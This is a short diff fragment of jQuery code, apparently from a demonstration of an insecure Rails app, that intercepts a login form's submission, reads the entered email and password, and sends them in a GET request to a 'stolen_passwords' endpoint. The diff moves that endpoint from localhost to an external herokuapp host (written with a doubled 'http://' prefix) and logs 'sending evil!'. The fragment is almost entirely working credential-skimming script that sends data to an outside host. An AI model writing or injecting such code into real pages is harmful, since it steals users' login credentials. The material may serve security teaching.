@@ -18,7 +18,7 @@
   $( &quot;#login_form&quot; ).submit(function( event ) {<br/>
     var email = $( &quot;#user_email &quot; )[0].value<br/>
     var password = $( &quot;#user_password &quot; )[0].value<br/>
-    url = &quot;http://localhost:3000/stolen_passwords/create?email=&quot;+ email + &quot;&amp;password=&quot; + password<br/>
+    url = &quot;http://http://unsecuredrails.herokuapp.com/stolen_passwords/create?email=&quot;+ email + &quot;&amp;password=&quot; + password<br/>
     console.log("sending evil!" + password)<br/>
     $.get(url)<br/>
   });<br/>
